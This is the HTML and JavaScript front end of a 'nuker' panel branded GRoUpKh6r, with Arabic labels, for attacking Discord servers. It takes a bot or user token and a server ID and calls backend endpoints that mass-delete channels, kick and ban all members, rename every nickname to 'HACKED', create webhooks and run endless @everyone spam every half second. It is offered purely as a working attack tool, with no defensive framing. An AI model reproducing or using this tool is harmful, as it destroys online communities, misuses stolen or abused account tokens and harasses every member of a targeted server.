<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NUKER-PANEL // GRoUpKh6r</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #080808; color: #ff2255; font-family: 'Courier New', Courier, monospace; padding: 10px; }
        .box { max-width: 600px; margin: 20px auto; background: #121212; border: 2px solid #ff2255; padding: 15px; box-shadow: 0 0 25px rgba(255, 34, 85, 0.4); }
        .header { text-align: center; border-bottom: 2px dashed #ff2255; padding-bottom: 10px; margin-bottom: 15px; color: #00ffcc; font-size: 18px; font-weight: bold; }
        label { display: block; margin-top: 10px; color: #fff; font-size: 13px; }
        input, select { width: 100%; padding: 10px; margin-top: 5px; background: #000; border: 1px solid #00ffcc; color: #00ffcc; font-family: monospace; }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px; }
        button { width: 100%; padding: 12px; margin-top: 10px; background: #ff2255; color: #fff; border: none; font-weight: bold; cursor: pointer; font-family: monospace; }
        button:hover { background: #00ffcc; color: #000; }
        .btn-danger { background: #990000; }
        .btn-danger:hover { background: #ff0000; color: #fff; }
        .log-box { margin-top: 15px; background: #000; border: 1px solid #444; padding: 10px; height: 100px; overflow-y: scroll; color: #00ff66; font-size: 11px; }
    </style>
</head>
<body>

    <!-- تشغيل راب درب المهالك بشكل متكرر تلقائياً -->
    <audio id="darbAudio" src="https://cdnsound.org/track/darb-el-mahalek-rap.mp3" loop autoplay></audio>

    <div class="box">
        <div class="header">GRoUpKh6r // NUKER-PANEL COMMANDS</div>

        <label>نوع المصادقة:</label>
        <select id="isBot">
            <option value="true">Bot Token</option>
            <option value="false">User Token</option>
        </select>

        <label>التوكن (Token):</label>
        <input type="password" id="token" placeholder="أدخل التوكن هنا">

        <label>معرف السيرفر (Server ID):</label>
        <input type="text" id="guildId" placeholder="أدخل آي دي السيرفر">

        <hr style="border: 0.5px solid #333; margin: 15px 0;">

        <label>إعدادات الرومات:</label>
        <input type="text" id="channelName" value="nuker-by-groupkh6r">
        <input type="number" id="channelCount" value="40">
        <div class="btn-group">
            <button onclick="exec('/api/channels/create', {name: document.getElementById('channelName').value, count: document.getElementById('channelCount').value})">إنشاء رومات</button>
            <button class="btn-danger" onclick="exec('/api/channels/delete')">حذف كل الرومات</button>
        </div>

        <label>إدارة الأعضاء:</label>
        <input type="text" id="newNickname" value="GRoUpKh6r HACKED">
        <button onclick="exec('/api/members/nicknames', {newNickname: document.getElementById('newNickname').value})">تغيير ألقاب الكل</button>
        <div class="btn-group">
            <button class="btn-danger" onclick="exec('/api/members/kick')">طرد كل الأعضاء</button>
            <button class="btn-danger" onclick="exec('/api/members/ban')">حظر كل الأعضاء</button>
        </div>

        <label>السبام والويب هوكس (مستمر):</label>
        <input type="text" id="webhookName" value="GRoUpKh6r-Spammer">
        <button onclick="exec('/api/webhooks/create', {webhookName: document.getElementById('webhookName').value})">زرع Webhooks بالرومات</button>
        
        <input type="text" id="spamMessage" value="@everyone | NUKER SYSTEM ACTIVE - GRoUpKh6r">
        <button class="btn-danger" onclick="startWebhookSpam()">بدء سبام الويب هوكس الخارق (لا يتوقف)</button>

        <div class="log-box" id="logBox">[System] Ready. Click anywhere to enable audio stream.</div>
    </div>

    <script>
        // تفعيل الصوت تلقائياً عند أول ضغطة
        document.body.addEventListener('click', () => {
            const audio = document.getElementById('darbAudio');
            if(audio.paused) audio.play();
        }, { once: true });

        let spamInterval = null;

        function log(msg) {
            const box = document.getElementById('logBox');
            box.innerHTML += `<br>> ${msg}`;
            box.scrollTop = box.scrollHeight;
        }

        async function exec(endpoint, extra = {}) {
            const token = document.getElementById('token').value;
            const guildId = document.getElementById('guildId').value;
            const isBot = document.getElementById('isBot').value === 'true';

            if (!token || !guildId) {
                alert('أدخل التوكن وآي دي السيرفر!');
                return;
            }

            log(`Executing: ${endpoint}`);
            try {
                const res = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token, guildId, isBot, ...extra })
                });
                const data = await res.json();
                log(data.message || 'Done.');
            } catch (err) {
                log(`Error: ${err.message}`);
            }
        }

        // سبام لا يتوقف عبر الويب هوكس بشكل متزامن
        function startWebhookSpam() {
            if (spamInterval) {
                clearInterval(spamInterval);
                spamInterval = null;
                log('[!] Webhook Spam Stopped.');
                return;
            }
            log('[*] Starting continuous Webhooks spam wave...');
            spamInterval = setInterval(() => {
                exec('/api/webhooks/spam', { message: document.getElementById('spamMessage').value });
            }, 500); // إرسال موجة كل نصف ثانية بلا انقطاع
        }
    </script>
</body>
</html>
